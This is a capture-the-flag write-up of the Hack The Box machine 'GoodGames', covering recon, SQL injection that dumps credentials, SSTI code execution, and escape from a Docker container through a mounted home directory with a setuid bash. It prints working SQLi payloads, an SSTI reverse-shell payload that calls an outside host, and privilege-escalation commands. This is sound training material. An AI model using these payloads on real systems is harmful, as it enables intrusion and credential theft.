---
title: "GoodGames"
date: 2025-07-31 14:04:00 +0500
categories: [Boxes]
tags: [HTB, Box, Linux, Easy]
---

## Recon

### Port Discovery

```bash
sudo nmap -PN -sC -sV -oN GoodGames 10.10.11.130
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-31 14:09 PKT
Nmap scan report for 10.10.11.130
Host is up (0.21s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.9.2)
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
|_http-title: GoodGames | Community and Store

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.98 seconds
```

It's a simple website with no point of interest. Let's enumerate the directories and sub-domains:

### Directory Fuzzing

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://goodgames.htb/FUZZ -ic -t 80 -fw 2096

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://goodgames.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 80
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 2096
________________________________________________

                        [Status: 200, Size: 85107, Words: 29274, Lines: 1735, Duration: 96ms]
blog                    [Status: 200, Size: 44212, Words: 15590, Lines: 909, Duration: 176ms]
profile                 [Status: 200, Size: 9267, Words: 2093, Lines: 267, Duration: 253ms]
login                   [Status: 200, Size: 9294, Words: 2101, Lines: 267, Duration: 308ms]
signup                  [Status: 200, Size: 33387, Words: 11042, Lines: 728, Duration: 97ms]
logout                  [Status: 302, Size: 208, Words: 21, Lines: 4, Duration: 83ms]
forgot-password         [Status: 200, Size: 32744, Words: 10608, Lines: 730, Duration: 209ms]
coming-soon             [Status: 200, Size: 10524, Words: 2489, Lines: 287, Duration: 124ms]
                        [Status: 200, Size: 85107, Words: 29274, Lines: 1735, Duration: 215ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 120ms]
:: Progress: [220546/220546] :: Job [1/1] :: 382 req/sec :: Duration: [0:08:44] :: Errors: 0 ::
```

### Sub-domain Fuzzing

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://FUZZ.goodgames.htb -t 80

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://FUZZ.goodgames.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 80
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

:: Progress: [4989/4989] :: Job [1/1] :: 76 req/sec :: Duration: [0:01:01] :: Errors: 4989 ::
```

Let's investigate the discovered directories.

- `/signup` - Allows for registering a user. 
- `/login` - Allows for that user to login.

After logging in it redirects us to `/profile` but nothing of interest their either. It's time for us to fire up burpsuite and investigate requests.

### Investigating Requests

This is the login request:

```http
POST /login HTTP/1.1
Host: goodgames.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
Origin: http://goodgames.htb
Connection: keep-alive
Referer: http://goodgames.htb/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

email=test%40mail.com&password=test123
```

#### SQLi

We will attempt an SQLi. On submitting an SQLi Payload `' or 1=1-- -`:

```http
POST /login HTTP/1.1
Host: goodgames.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Origin: http://goodgames.htb
Connection: keep-alive
Referer: http://goodgames.htb/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

email=' or 1=1-- -&password=test123
```

We get the response:

`Welcome admintest123`

We can see there are two users at least. `admin` and `test123`

We will try a union injection to get data from other table. Let's figure out the number of columns. 

Only after selecting 4 columns do we get a successful login:

`email=' union select 1,2,3,4-- -&password=test123`

Let's figure out all the database that exists:

`email=' union select 1,2,3,schema_name FROM INFORMATION_SCHEMA.SCHEMATA-- -&password=test123`

We get the response:

`Welcome information_schemamain`

Let's query main and figure out the tables that exist:

`email=' union select 1,2,3,TABLE_NAME from INFORMATION_SCHEMA.TABLES where table_schema='main'-- -&password=test123`

Response:

`Welcome blogblog_commentsuser`

blog, blog_comments, and user.

We can also figure out the number of columns:

`email=' union select 1,2,3,COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where table_name='user'-- -&password=test123`

Response:

`Welcome emailidnamepassword`

email, id, name, password.

Let's dump user data. Since we have only one reflected column but we want to dump data of multiple columns we will use a seperator and concat it:

`email=' union select 1,2,3,CONCAT_WS(':', id, email, name, password) from user-- -&password=test123`

Response:

```
1:admin@goodgames.htb:admin:2b22337f218b2d82dfc3b6f77e7cb8ec
2:test@mail.com:test123:cc03e747a6afbbcbf8be7668acfebee5
```

This is an md5 hash and admin hash cracks to:

`admin:superadministrator`

Now let's login as admin.

## Foothold and Privilege Escalation

There's a gear on admin top-right profile page. Clicking it redirects us to:

`http://internal-administration.goodgames.htb/`

Add it to `/etc/hosts`. 

![alt text](/assets/images/GoodGames-internal.png)

Let's try admin creds. They work.

![alt text](/assets/images/GoodGames-task.png)

They all take us nowhere. The only page worth looking at is profile. I can enter a full name and it's reflected verbatim.

### Understanding Tech Stack

```bash
whatweb http://internal-administration.goodgames.htb
http://internal-administration.goodgames.htb/ [302 Found] Country[RESERVED][ZZ], HTTPServer[Werkzeug/2.0.2 Python/3.6.7], IP[10.10.11.130], Python[3.6.7], RedirectLocation[http://internal-administration.goodgames.htb/login], Title[Redirecting...], Werkzeug[2.0.2]
http://internal-administration.goodgames.htb/login [200 OK] Bootstrap, Cookies[session], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.0.2 Python/3.6.7], HttpOnly[session], IP[10.10.11.130], Meta-Author[Themesberg], Open-Graph-Protocol[website], PasswordField[password], Python[3.6.7], Script, Title[Flask Volt Dashboard -  Sign IN  | AppSeed][Title element contains newline(s)!], Werkzeug[2.0.2]
```

It's the same python backend. Usually in such scenarios where user input is reflected verbatim we can try SSTI. 

### SSTI

Let's do a test to identify if SSTI exists or not.

`{{7*7}}`

![alt text](/assets/images/GoodGames-SSTI.png)

It does exist.

Since this is python it is easy to gather SSTI payload:

`{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`

We got the response:

`uid=0(root) gid=0(root) groups=0(root)`

We will just get reverse shell as root. 

`{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.16.30/1234 0>&1"').read() }}`

and we have reverse shell as root:

```bash
nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.16.30] from (UNKNOWN) [10.10.11.130] 58834
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@3a453ab39d3d:/backend# 
```

We only have the user flag down and it seems like we are inside a docker environment. 

```bash
root@3a453ab39d3d:/backend# ls -la /
ls -la /
total 88
drwxr-xr-x   1 root root 4096 Nov  5  2021 .
drwxr-xr-x   1 root root 4096 Nov  5  2021 ..
-rwxr-xr-x   1 root root    0 Nov  5  2021 .dockerenv
drwxr-xr-x   1 root root 4096 Nov  5  2021 backend
drwxr-xr-x   1 root root 4096 Nov  5  2021 bin
drwxr-xr-x   2 root root 4096 Oct 20  2018 boot
drwxr-xr-x   5 root root  340 Jul 31 08:43 dev
drwxr-xr-x   1 root root 4096 Nov  5  2021 etc
drwxr-xr-x   1 root root 4096 Nov  5  2021 home
drwxr-xr-x   1 root root 4096 Nov 16  2018 lib
drwxr-xr-x   2 root root 4096 Nov 12  2018 lib64
drwxr-xr-x   2 root root 4096 Nov 12  2018 media
drwxr-xr-x   2 root root 4096 Nov 12  2018 mnt
drwxr-xr-x   2 root root 4096 Nov 12  2018 opt
dr-xr-xr-x 174 root root    0 Jul 31 08:43 proc
drwx------   1 root root 4096 Nov  5  2021 root
drwxr-xr-x   3 root root 4096 Nov 12  2018 run
drwxr-xr-x   1 root root 4096 Nov  5  2021 sbin
drwxr-xr-x   2 root root 4096 Nov 12  2018 srv
dr-xr-xr-x  13 root root    0 Jul 31 08:43 sys
drwxrwxrwt   1 root root 4096 Nov  5  2021 tmp
drwxr-xr-x   1 root root 4096 Nov 12  2018 usr
drwxr-xr-x   1 root root 4096 Nov 12  2018 var
```

## Enumeration again

Our current docker host has this IP:

```bash
root@3a453ab39d3d:~# ifconfig
ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.19.0.2  netmask 255.255.0.0  broadcast 172.19.255.255
        ether 02:42:ac:13:00:02  txqueuelen 0  (Ethernet)
        RX packets 2558  bytes 458515 (447.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2121  bytes 1954493 (1.8 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Let's do a network sweep to figure out other active hosts.

```bash
root@3a453ab39d3d:~# seq 1 254 | xargs -n1 -P50 -I{} ping -c1 -W1 172.19.0.{} | grep 'bytes from' | cut -d' ' -f4 | tr -d ':'
172.19.0.1
172.19.0.2
```

`172.19.0.1` should be the main host.

Let's do a port scan from inside the docker:

```bash
root@3a453ab39d3d:~# for port in {1..1024}; do (echo >/dev/tcp/172.19.0.1/$port) >/dev/null 2>&1 && echo "Port $port is open"; done
Port 22 is open
Port 80 is open
```

Let's try and use the same password for the user `augustus` and SSH. 

```bash
root@3a453ab39d3d:~# ssh augustus@172.19.0.1
The authenticity of host '172.19.0.1 (172.19.0.1)' can't be established.
ECDSA key fingerprint is SHA256:AvB4qtTxSVcB0PuHwoPV42/LAJ9TlyPVbd7G6Igzmj0.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.19.0.1' (ECDSA) to the list of known hosts.
augustus@172.19.0.1's password: 
Permission denied, please try again.
augustus@172.19.0.1's password: 
Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
augustus@GoodGames:~$ 
```

Time for more enumeration.

What we missed as root in docker environment is:

```bash
/dev/sda1 on /home/augustus type ext4 (rw,relatime,errors=remount-ro)
/dev/sda1 on /etc/resolv.conf type ext4 (rw,relatime,errors=remount-ro)
/dev/sda1 on /etc/hostname type ext4 (rw,relatime,errors=remount-ro)
/dev/sda1 on /etc/hosts type ext4 (rw,relatime,errors=remount-ro)
```

```bash
root@3a453ab39d3d:~# ls -la /home/augustus/
total 1232
drwxr-xr-x 2 1000 1000    4096 Jul 31 10:24 .
drwxr-xr-x 1 root root    4096 Nov  5  2021 ..
lrwxrwxrwx 1 root root       9 Nov  3  2021 .bash_history -> /dev/null
-rw-r--r-- 1 1000 1000     220 Oct 19  2021 .bash_logout
-rw-r--r-- 1 1000 1000    3526 Oct 19  2021 .bashrc
-rw-r--r-- 1 1000 1000     807 Oct 19  2021 .profile
-rwxr-xr-x 1 1000 1000 1234376 Jul 31 10:24 bash
-rw-r----- 1 root 1000      33 Jul 31 08:44 user.txt
```

### Abusing Permissions

That the user's home directory is mounted inside the docker container from the main system. We are root inside the docker environment. So if we have anything in the user directory we can change it's permission to be owned by root and make it so that any user can execute it as root. 

Let's copy `/bin/bash` as augustus on SSH.

```bash
cp /bin/bash .
exit
```

Then from docker: 

```bash
chown root:root bash
chmod 4755 bash
```

4755 means:

- The binary is owned by root (or another user),
- When any user executes it, it runs with root's privileges (if owned by root),
- But users can’t modify the binary (unless they’re root),
- The s in rws indicates SUID is active.

Now:

```bash
root@3a453ab39d3d:/home/augustus# ssh augustus@172.19.0.1
augustus@172.19.0.1's password: 
Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul 31 11:19:58 2025 from 172.19.0.2
augustus@GoodGames:~$ ls -la
total 1232
drwxr-xr-x 2 augustus augustus    4096 Jul 31 11:24 .
drwxr-xr-x 3 root     root        4096 Oct 19  2021 ..
-rwsr-xr-x 1 root     root     1234376 Jul 31 11:24 bash
lrwxrwxrwx 1 root     root           9 Nov  3  2021 .bash_history -> /dev/null
-rw-r--r-- 1 augustus augustus     220 Oct 19  2021 .bash_logout
-rw-r--r-- 1 augustus augustus    3526 Oct 19  2021 .bashrc
-rw-r--r-- 1 augustus augustus     807 Oct 19  2021 .profile
-rw-r----- 1 root     augustus      33 Jul 31 09:44 user.txt

```

```bash
augustus@GoodGames:~$ ./bash -p
bash-5.1# id
uid=1000(augustus) gid=1000(augustus) euid=0(root) groups=1000(augustus)
bash-5.1# cd /root
bash-5.1# cat root.txt
```

The `-p` flag preserves the effective user ID and group ID when running a shell, instead of dropping privileges.

---
